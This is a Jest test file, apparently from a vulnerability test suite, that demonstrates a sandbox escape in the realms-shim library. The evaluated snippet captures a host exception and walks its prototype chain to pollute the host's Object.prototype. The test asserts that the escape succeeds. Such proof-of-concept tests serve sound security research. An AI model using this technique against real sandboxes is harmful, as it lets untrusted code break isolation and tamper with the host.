test("Arbitrary code execution in realms-shim", () => {
  expect.assertions(2);
  let Realm = require("realms-shim");
  const r = Realm.makeRootRealm();
  expect({}.polluted).toBe(undefined);
  try {
    r.evaluate(`let HostException;
          try{
               (0, eval)('--'+'>');
          }catch(e){
               HostException = e;
          }
          const HostObject = HostException.__proto__.__proto__.__proto__;
          HostObject.polluted = 'yes';
          `);
  } catch (error) {}
  expect({}.polluted).toBe("yes");
});
